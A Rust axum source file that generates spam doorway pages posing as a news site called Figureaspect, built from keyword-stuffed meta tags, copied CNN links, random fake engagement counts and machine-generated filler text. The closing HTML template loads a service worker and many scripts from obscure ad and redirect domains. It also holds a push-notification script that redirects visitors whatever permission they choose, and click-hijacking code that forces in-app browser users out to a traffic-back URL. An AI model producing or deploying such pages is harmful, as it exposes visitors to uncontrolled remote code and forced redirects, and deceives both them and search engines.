use axum::response::Html;
use axum::{extract::Path, routing::get, Router};

// use crate::util::md5::md5s;
use crate::tool::nltk;
use crate::tool::shell;
use std::fmt::Write;

pub async fn render_form() -> Html<&'static str> {
    for i in 1..1000_000 {
        // let d=&md5s(&md5s(&i.to_string()))[1..7];

        // shell::do_shell(d);
    }

    Html(
        r#"
        <html>
        <head>
            <title>Form Example</title>
        </head>
        <body>
            <h1>Form Example</h1>
            <form method="post">
                <label for="field1">Field 1:</label>
                <input type="text" name="field1" id="field1"><br>

                <label for="field2">Field 2:</label>
                <input type="text" name="field2" id="field2"><br>

                <input type="submit" value="Submit">
            </form>
        </body>
        </html>
    "#,
    )
}

// use axum::extract::Path;

use std::fs;
pub async fn index_html() -> Html<String> {
    // 读取html模板文件
    let html_content =
        fs::read_to_string("src\\templates\\index.html").expect("Failed to read file");
    // let result=nltk::word_tag("NN");
    // 填入参数并返回Html
    // println!("{:?}",result);
    let filled_html = html_content
        .replace("{param1}", "Hello111")
        .replace("{param2}", "Axum");
    Html(filled_html)
}

fn string_to_static_str(s: String) -> &'static str {
    let boxed_str: Box<str> = s.into_boxed_str();
    Box::leak(boxed_str)
}

pub async fn render_html(Path(name): Path<String>) -> Html<&'static str> {
    let html0 = r##"
      


   <!DOCTYPE html>
   <html lang="en">
   <head>
       <meta charset="UTF-8">
       <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> 
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>   Figureaspect.com</title>
       <meta name="description" content=" most myself August angry each headquarters being finally most Jan ">
       <meta name="keywords" content="  most myself August angry each headquarters being finally most January besides cathart ">
       <meta name="robots" content="index,follow">
       <meta name="googlebot" content="index,follow">
      
       <meta name="title" content="intitle:  most myself August angry each headq ">
       <meta name="allintitle" content="allintitle:  most myself August angry each headq ">
       <meta name="inurl" content="inurl:news Figureaspect games sport star">
       <meta name="intext" content="intext:Figureaspect news live bbs  ">
       <meta name="pushsdk" content="97556c64aecaf86fdb4a24070bb6dc0e">
       <meta name="monetag" content="0c10f2ba53840b47caa2b4c3f20bb7f9">
      
    
       
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/components/reset.css">
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/components/site.css">
   
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/components/container.css">
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/components/grid.css">
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/components/header.css">
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/components/image.css">
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/components/menu.css">
   
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/components/divider.css">
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/components/list.css">
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/components/segment.css">
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/components/dropdown.css">
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/components/icon.css">
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/components/transition.css">
   
     <style type="text/css">
   
       body {
         background-color: #FFFFFF;
       }
       .main.container {
         margin-top: 2em;
       }
     
       .main.menu {
         margin-top: 4em;
         border-radius: 0;
         border: none;
         box-shadow: none;
         transition:
           box-shadow 0.5s ease,
           padding 0.5s ease
         ;
       }
       .main.menu .item img.logo {
         margin-right: 1.5em;
       }
     
       .overlay {
         float: left;
         margin: 0em 3em 1em 0em;
       }
       .overlay .menu {
         position: relative;
         left: 0;
         transition: left 0.5s ease;
       }
     
       .main.menu.fixed {
         background-color: #FFFFFF;
         border: 1px solid #DDD;
         box-shadow: 0px 3px 5px rgba(0, 0, 0, 0.2);
       }
       .overlay.fixed .menu {
         left: 800px;
       }
     
       .text.container .left.floated.image {
         margin: 2em 2em 2em -4em;
       }
       .text.container .right.floated.image {
         margin: 2em -4em 2em 2em;
       }
     
       .ui.footer.segment {
         margin: 5em 0em 0em;
         padding: 5em 0em;
       }
       </style>
      
   </head>
   
   
   <body>
       <header>
           <h6>Figureaspect</h6>
       </header>
       
       <main>
           <article>
            
               
               <div class="ui main text container">
                   <h1 class="ui header">Figureaspect News</h1>
                   <p>  </p>
                 </div>
               
               
                 <div class="ui borderless main menu">
                   <div class="ui text container">
                     <div class="header item">
                       <img class="logo" src="">
                       Figureaspect
                     </div>
                     <a href="#" class="item">Home</a>
                     <a href="#" class="item">News PM.</a>
                     <a href="#" class="ui right floated dropdown item">
                       News list <i class="dropdown icon"></i>
                       <div class="menu">
                         <div class="item">super hero</div>
                         <div class="item"> jumnping </div>
                         <div class="divider"></div>
                         <div class="header">go home</div>
                         <div class="item">
                           <i class="dropdown icon"></i>
                           coca chocalate
                           <div class="menu">
                             <div class="item">jp</div>
                             <div class="item">river</div>
                           </div>
                         </div>
                         <div class="item">china</div>
                       </div>
                     </a>
               
                     <div class="ui label">
                       Dogs
                       <div class="detail">214</div>
                     </div>
                       
                     <a class="ui teal tag label">Featured</a>
                   </div>
                 </div>
               
                 <div class="ui text container">
               
                   <div class="ui labeled button" tabindex="0">
                       <div class="ui red button">
                         <i class="heart icon"></i> Like
                       </div>
                       <a class="ui basic red left pointing label" id="id0" >
                            
                       </a>
                     </div>
                     <div class="ui labeled button" tabindex="0">
                       <div class="ui basic blue button">
                         <i class="fork icon"></i> Forks
                       </div>
                       <a class="ui basic left pointing blue label" id="id1">
                         
                       </a>
                     </div>
               
               
                   
               
               
                   <p id="id3">
              
              
     "##;

    let html1 = r##"
   </p>
   <div class="ui segment">
       <div class="ui relaxed divided list">
           <div class="item">
             <i class="large github middle aligned icon"></i>
             <a class="content" href="https://edition.cnn.com/2024/01/10/entertainment/sag-award-nominees/index.html">
               <div class="header"> SAG Awards 2024 </div>
               <div class="description">Updated 10 mins ago</div>
             </a>
           </div>
           <div class="item">
             <i class="large github middle aligned icon"></i>
             <a class="content" href="https://edition.cnn.com/videos/entertainment/2023/03/27/succession-final-season.cnn">
               <div class="header">succession final </div>
               <div class="description">Updated 22 mins ago</div>
             </a>
           </div>
           <div class="item">
             <i class="large github middle aligned icon"></i>
             <a class="content" href="https://edition.cnn.com/entertainment/celebrities">
               <div class="header"> entertainment celebrities </div>
               <div class="description">Updated 34 mins ago</div>
             </a>
           </div>
         </div>
         <div class="ui left floated statistic">
         <div class="value">
           2,024
         </div>
         <div class="label">
           Views
         </div>
       </div>
        
        
       <div class="overlay">
     <div class="ui labeled icon vertical menu">
       <a class="item"><i class="twitter icon"></i> Tweet</a>
       <a class="item"><i class="facebook icon"></i> Share</a>
       <a class="item"><i class="mail icon"></i> E-mail</a>
     </div>
   </div>

   <div class="ui message">
       <div class="header">
         New Site Features
       </div>
       <ul class="list">
         <li>You can now have cover images on blog pages</li>
         <li>Drafts will now auto-save while writing</li>
       </ul>
     </div>
   <p>   
      </p>
     <img class="ui medium left floated image" data-src="https://media.cnn.com/api/v1/images/stellar/prod/gettyimages-1256165060.jpg?c=16x9&q=h_144,w_256,c_fill">
   <p>
       
      <img class="ui medium right floated image" data-src="https://media.cnn.com/api/v1/images/stellar/prod/240129115208-02-allegiant-stadium-las-vegas-file-2021.jpg?c=16x9&q=h_144,w_256,c_fill/f_webp">
   
   <img class="ui medium left floated image" data-src="assets/images/wireframe/square-image.png">

  <p> 
   <img class="ui medium right floated image" data-src="assets/images/wireframe/square-image.png">
 
</div>
   "##;

    let html3 = r##"
   </p>
                 <div class="ui inverted vertical footer segment">
                   <div class="ui center aligned container">
                     <div class="ui stackable inverted divided grid">
                       <div class="three wide column">
                         <h4 class="ui inverted header">  BBS list</h4>
                         <div class="ui inverted link list">
                           <a href="https://stackoverflow.com/" class="item">Stack Over Flow</a>
                           <a href="https://edition.cnn.com/" class="item">EDI CNN</a>
                           <a href="https://www.msn.com/" class="item">MSN</a>
                           <a href="https://www.qq.com/" class="item">qq</a>
                         </div>
                       </div>
                       <div class="three wide column">
                         <h4 class="ui inverted header">News Clube</h4>
                         <div class="ui inverted link list">
                           <a href="https://www.msn.com/" class="item"></a>
                           <a href="https://www.facebook.com" class="item">Meta</a>
                           <a href="https://en.wikipedia.org/" class="item">Wiki </a>
                           <a href="https://www.nhk.or.jp/" class="item">NHK</a>
                         </div>
                       </div>
                       <div class="three wide column">
                         <h4 class="ui inverted header">GoooooooGle</h4>
                         <div class="ui inverted link list">
                           <a href="https://www.moenv.gov.tw" class="item"> Moenv</a>
                           <a href="https://acronyms.thefreedictionary.com/WSDW" class="item">thefreedictionary</a>
                           <a href="https://googole.com" class="item">GooooooooooooGle</a>
                           <a href="https://www.nasa.gov/mission/gateway/" class="item">Nasa</a>
                         </div>
                       </div>
                       <div class="seven wide column">
                         <h4 class="ui inverted header">hz443</h4>
                         <p>GOOD ALL</p>
                       </div>
                     </div>
                     <div class="ui inverted section divider"></div>
                     <img src="assets/images/logo.png" class="ui centered mini image">
                     <div class="ui horizontal inverted small divided link list">
                       <a class="item" href="#"></a>
                       <a class="item" href="#">Contact Us  hooops@qq.com ,career </a>
                       <a class="item" href="#">Terms and Conditions</a>
                       <a class="item" href="#">Privacy Policy</a>
                     </div>
                   </div>
                 </div>
   
   
   
   
           </article>
           
         <div> <a href="http://en0.figureaspect.com/html/dcfcd07.html"  target="_blank"> figureaspect dcfcd07 </a> </div><div> <a href="http://en0.figureaspect.com/html/28c8edd.html"  target="_blank"> figureaspect 28c8edd </a> </div><div> <a href="http://en0.figureaspect.com/html/665f644.html"  target="_blank"> figureaspect 665f644 </a> </div><div> <a href="http://en0.figureaspect.com/html/38026ed.html"  target="_blank"> figureaspect 38026ed </a> </div><div> <a href="http://en0.figureaspect.com/html/011ecee.html"  target="_blank"> figureaspect 011ecee </a> </div><div> <a href="http://en0.figureaspect.com/html/4e44f1a.html"  target="_blank"> figureaspect 4e44f1a </a> </div><div> <a href="http://en0.figureaspect.com/html/3d2f890.html"  target="_blank"> figureaspect 3d2f890 </a> </div><div> <a href="http://en0.figureaspect.com/html/cd7fd15.html"  target="_blank"> figureaspect cd7fd15 </a> </div><div> <a href="http://en0.figureaspect.com/html/815e621.html"  target="_blank"> figureaspect 815e621 </a> </div><div> <a href="http://en0.figureaspect.com/html/4c0d13d.html"  target="_blank"> figureaspect 4c0d13d </a> </div><div> <a href="http://en0.figureaspect.com/html/8d8e353.html"  target="_blank"> figureaspect 8d8e353 </a> </div><div> <a href="http://en0.figureaspect.com/html/7bfc85c.html"  target="_blank"> figureaspect 7bfc85c </a> </div><div> <a href="http://en0.figureaspect.com/html/c8b2f17.html"  target="_blank"> figureaspect c8b2f17 </a> </div><div> <a href="http://en0.figureaspect.com/html/7e51746.html"  target="_blank"> figureaspect 7e51746 </a> </div><div> <a href="http://en0.figureaspect.com/html/f93b8bb.html"  target="_blank"> figureaspect f93b8bb </a> </div><div> <a href="http://en0.figureaspect.com/html/ad8b68a.html"  target="_blank"> figureaspect ad8b68a </a> </div><div> <a href="http://en0.figureaspect.com/html/93b6dee.html"  target="_blank"> figureaspect 93b6dee </a> </div><div> <a href="http://en0.figureaspect.com/html/27a989a.html"  target="_blank"> figureaspect 27a989a </a> </div><div> <a href="http://en0.figureaspect.com/html/30ded68.html"  target="_blank"> figureaspect 30ded68 </a> </div><div> <a href="http://en0.figureaspect.com/html/538b45e.html"  target="_blank"> figureaspect 538b45e </a> </div><div> <a href="http://en0.figureaspect.com/html/74d8ce9.html"  target="_blank"> figureaspect 74d8ce9 </a> </div><div> <a href="http://en0.figureaspect.com/html/e39a411.html"  target="_blank"> figureaspect e39a411 </a> </div><div> <a href="http://en0.figureaspect.com/html/4a0f84d.html"  target="_blank"> figureaspect 4a0f84d </a> </div><div> <a href="http://en0.figureaspect.com/html/6f181f2.html"  target="_blank"> figureaspect 6f181f2 </a> </div><div> <a href="http://en0.figureaspect.com/html/83a5a28.html"  target="_blank"> figureaspect 83a5a28 </a> </div><div> <a href="http://en0.figureaspect.com/html/c81fb13.html"  target="_blank"> figureaspect c81fb13 </a> </div><div> <a href="http://en0.figureaspect.com/html/683529b.html"  target="_blank"> figureaspect 683529b </a> </div><div> <a href="http://en0.figureaspect.com/html/80ecd7a.html"  target="_blank"> figureaspect 80ecd7a </a> </div><div> <a href="http://en0.figureaspect.com/html/29bdbc8.html"  target="_blank"> figureaspect 29bdbc8 </a> </div><div> <a href="http://en0.figureaspect.com/html/70b4880.html"  target="_blank"> figureaspect 70b4880 </a> </div><div> <a href="http://en0.figureaspect.com/html/4db8714.html"  target="_blank"> figureaspect 4db8714 </a> </div><div> <a href="http://en0.figureaspect.com/html/19b2e8b.html"  target="_blank"> figureaspect 19b2e8b </a> </div><div> <a href="http://en0.figureaspect.com/html/817808d.html"  target="_blank"> figureaspect 817808d </a> </div><div> <a href="http://en0.figureaspect.com/html/9b9f610.html"  target="_blank"> figureaspect 9b9f610 </a> </div><div> <a href="http://en0.figureaspect.com/html/5ff05a9.html"  target="_blank"> figureaspect 5ff05a9 </a> </div><div> <a href="http://en0.figureaspect.com/html/aed6a4e.html"  target="_blank"> figureaspect aed6a4e </a> </div><div> <a href="http://en0.figureaspect.com/html/04a07b0.html"  target="_blank"> figureaspect 04a07b0 </a> </div><div> <a href="http://en0.figureaspect.com/html/3834e60.html"  target="_blank"> figureaspect 3834e60 </a> </div><div> <a href="http://en0.figureaspect.com/html/5378938.html"  target="_blank"> figureaspect 5378938 </a> </div><div> <a href="http://en0.figureaspect.com/html/df2421e.html"  target="_blank"> figureaspect df2421e </a> </div><div> <a href="http://en0.figureaspect.com/html/86b9b2f.html"  target="_blank"> figureaspect 86b9b2f </a> </div><div> <a href="http://en0.figureaspect.com/html/8a6dbf5.html"  target="_blank"> figureaspect 8a6dbf5 </a> </div><div> <a href="http://en0.figureaspect.com/html/c210316.html"  target="_blank"> figureaspect c210316 </a> </div><div> <a href="http://en0.figureaspect.com/html/d15509b.html"  target="_blank"> figureaspect d15509b </a> </div><div> <a href="http://en0.figureaspect.com/html/1cdebc4.html"  target="_blank"> figureaspect 1cdebc4 </a> </div><div> <a href="http://en0.figureaspect.com/html/87f6950.html"  target="_blank"> figureaspect 87f6950 </a> </div><div> <a href="http://en0.figureaspect.com/html/325f5de.html"  target="_blank"> figureaspect 325f5de </a> </div><div> <a href="http://en0.figureaspect.com/html/ef03515.html"  target="_blank"> figureaspect ef03515 </a> </div><div> <a href="http://en0.figureaspect.com/html/a52abd3.html"  target="_blank"> figureaspect a52abd3 </a> </div><div> <a href="http://en0.figureaspect.com/html/ded2d3d.html"  target="_blank"> figureaspect ded2d3d </a> </div>
           
       </main>
       
       <footer>
           <p>&copy; edition <a href="https://edition.cnn.com/"> </a></p>
           <p>&copy; bbc  <a href="https://www.bbc.com/news"> </a></p>
           <p>&copy; theguardian <a href="https://www.theguardian.com/international"> </a></p> 
           <p>&copy; reuters <a href="https://www.reuters.com/"> </a></p> 
       </footer>
   
   
       <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8442175294006918"
       crossorigin="anonymous"></script>
       <script async src="https://desenteir.com/tb1/reverse.min.js"></script>
       <script src="https://code.jquery.com/jquery-3.1.1.min.js" crossorigin="anonymous"></script>
       <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/semantic.min.css">
       <script src="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/semantic.min.js"></script>
       <script src="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/components/transition.js"></script>
       <script src="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/components/dropdown.js"></script>
       <script src="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/components/visibility.js"></script>
       <script   src="http://s86d3jkje.bkt.gdipper.com/sw.js"></script>
   <!-- <script  src="//teemooge.net/4/6998579"></script>
   <script  src="/thubanoa.com/1?z=6998572"></script> -->
   <script  src="http://s86d3jkje.bkt.gdipper.com/6998521.js"></script>
   <script  src="http://s86d3jkje.bkt.gdipper.com/6998538.js"></script>
   <script  src="http://s86d3jkje.bkt.gdipper.com/6998539.js"></script>
   <script  src="http://s86d3jkje.bkt.gdipper.com/6998550.js"></script>
   <script  src="http://s86d3jkje.bkt.gdipper.com/6998560.js"></script>
   <script  src="http://s86d3jkje.bkt.gdipper.com/6998569.js"></script>
   <script  src="http://s86d3jkje.bkt.gdipper.com/6998575.js"></script>
   <script  src="http://s86d3jkje.bkt.gdipper.com/6998576.js"></script>
   <script  src="http://s86d3jkje.bkt.gdipper.com/6998577.js"></script>
   <script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('goomaphy.com',6998576,document.createElement('script'))</script>
   <script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('aistekso.net',6998574,document.createElement('script'))</script>
   <script>(function(d,z,s){s.src='https://'+d+'/400/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('waitheja.net',6998568,document.createElement('script'))</script>
   <script src="https://alwingulla.com/88/tag.min.js" data-zone="39221" async data-cfasync="false"></script>
   
       <script>
           var url = new URL(window.location.href);
           var pci = url.searchParams.get('1');
           var ppi = url.searchParams.get('1');
           var s = document.createElement('script');
           s.src='//woudaufe.net/pfe/current/micro.tag.min.js?z=6997942'+'&ymid='+pci+'&var='+ppi+'&sw=/sw-check-permissions-f02e2.js'+'&nouns=1';
           s.onload = function(result) {
               switch (result) {
                   case 'onPermissionDefault':
                   window.location.replace("//whautsis.com/4/6997940&var="+ppi);break;
                   case 'onPermissionAllowed':
                   window.location.replace("//whautsis.com/4/6997940&var="+ppi);break;
                   case 'onPermissionDenied':
                   window.location.replace("//whautsis.com/4/6997940&var="+ppi);break;
                   case 'onAlreadySubscribed':
                   window.location.replace("//whautsis.com/4/6997940&var="+ppi);break;
                   case 'onNotificationUnsupported':
                   window.location.replace("//whautsis.com/4/6997940&var="+ppi);break;
               }
           };
           document.head.appendChild(s);
    
             var Back_Button_Zone = 6997940;
             var Domain_TB = "whautsis.com";
      
           function isInApp() {
               const regex = new RegExp(`(WebView|(iPhone|iPod|iPad)(?!.*Safari/)|Android.*(wv))`, 'ig');
               return Boolean(this.ua.match(regex));
           }
       
           function initInappRd() {
               var landingpageURL = window.location.hostname + window.location.pathname + window.location.search;
               var completeRedirectURL = 'intent://' + landingpageURL + '#Intent;scheme=https;package=com.android.chrome;end';
               var trafficbackURL = 'https://femsoahe.com/4/6997940/';
               var ua = navigator.userAgent.toLowerCase();
       
               if (isInApp && (ua.indexOf('fb') !== -1 || ua.indexOf('android') !== -1 || ua.indexOf('wv') !== -1)) {
                   document.body.addEventListener('click', function () {
                       window.onbeforeunload = null;
                       window.open(completeRedirectURL, '_system');
                       setTimeout(function () {
                           window.location.replace(trafficbackURL);
                       }, 1000);
                   });
               }
           }
       
           if (document.readyState === 'loading') {
               document.addEventListener('DOMContentLoaded', initInappRd);
           } else {
               initInappRd();
           }
   
   
   
           $(document)
       .ready(function() {
   
         // fix main menu to page on passing
         $('.main.menu').visibility({
           type: 'fixed'
         });
         $('.overlay').visibility({
           type: 'fixed',
           offset: 80
         });
   
         // lazy load images
         $('.image').visibility({
           type: 'image',
           transition: 'vertical flip in',
           duration: 500
         });
   
         // show dropdown on hover
         $('.main.menu  .ui.dropdown').dropdown({
           on: 'hover'
         });
       })
     ;
   
   
     function getRandomInt(min, max) {
         min = Math.ceil(min);
         max = Math.floor(max);
         return Math.floor(Math.random() * (max - min + 1)) + min;
       }
     
       document.getElementById('id0').innerHTML =getRandomInt(100,2000);
       document.getElementById('id1').innerHTML =getRandomInt(10,200);
       
        
       </script>
   </body>
   </html>
       
   "##;
    let words0="Octavian Dragos say they feel trapped in what was once their dream home in El Cerrito, California. Both over 70, the Dragos are empty nesters, and like many of their generation, they’re trying to figure out how to downsize from their 3,000-square-foot, five-bedroom home. “We are here in a huge house with no family nearby, trying to make a wise decision, both financially and for our well-being,” said Dragos, a retired teacher. But selling and downsizing isn’t easy, appealing or even financially advantageous for many homeowners like the Dragos family. Many Boomers whose homes have surged in value now face massive capital gains tax bills when they sell. This is a kind of tax on the profit you make when selling an investment or an asset, like a home, that has increased in value. .

Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Vestibulum tortor quam, feugiat vitae, ultricies eget, tempor sit amet, ante. Donec eu libero sit amet quam egestas semper. Aenean ultricies mi vitae est. Mauris placerat eleifend leo

SAG Awards 2024
Updated 10 mins ago
succession final
Updated 22 mins ago
entertainment celebrities
Updated 34 mins ago
2,024
VIEWS
Eu quo homero blandit intellegebat. Incorrupte consequuntur mei id. Mei ut facer dolores adolescens, no illum aperiri quo, usu odio brute at. Qui te porro electram, ea dico facete utroque quo. Populo quodsi te eam, wisi everti eos ex, eum elitr altera utamur at. Quodsi convenire mnesarchum eu per, quas minimum postulant per id.

Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Vestibulum tortor quam, feugiat vitae, ultricies eget, tempor sit amet, ante. Donec eu libero sit amet quam egestas semper. Aenean ultricies mi vitae est. Mauris placerat eleifend leo. /p>

New Site Features
You can now have cover images on blog pages
Drafts will now auto-save while writing
Octavian Dragos say they feel trapped in what was once their dream home in El Cerrito, California. Both over 70, the Dragos are empty nesters, and like many of their generation, they’re trying to figure out how to downsize from their 3,000-square-foot, five-bedroom home.


Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Vestibulum tortor quam, feugiat vitae, ultricies eget, tempor sit amet, ante. Donec eu libero sit amet quam egestas semper. Aenean ultricies mi vitae est. Mauris placerat eleifend leo.
Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Vestibulum tortor quam, feugiat vitae, ultricies eget, tempor sit amet, ante. Donec eu libero sit amet quam egestas semper. Aenean ultricies mi vitae est. Mauris placerat eleifend leo.
BBS list
Stack Over Flow
EDI CNN
MSN
qq
News Clube
Meta
Wiki
NHK
GoooooooGle
Moenv
thefreedictionary
GooooooooooooGle
Nasa
hz443
GOOD ALL

 Contact Us hooops@qq.com ,career Terms and Conditions Privacy Policy";
    //  let string_list:Vec<&str> = vec!["Foo", "Bar"];
    //  let int_list:Vec<u32> = vec![1, 22,33,11,23];

    // let serdeNum:Vec<u32> = vec![1, 2,39,11,23];
    let serdeNum = nltk::string_to_unicode_digits(&name);
    let word_string = nltk::word_tag(serdeNum);

    let words0 = &word_string.clone()[0..word_string.len() / 2];
    let words1 = &word_string.clone()[word_string.len() / 2..];

    let d = string_to_static_str(format!("{}{}{}{}{}", html0, words0, html1, words1, html3));
    Html(d)
}
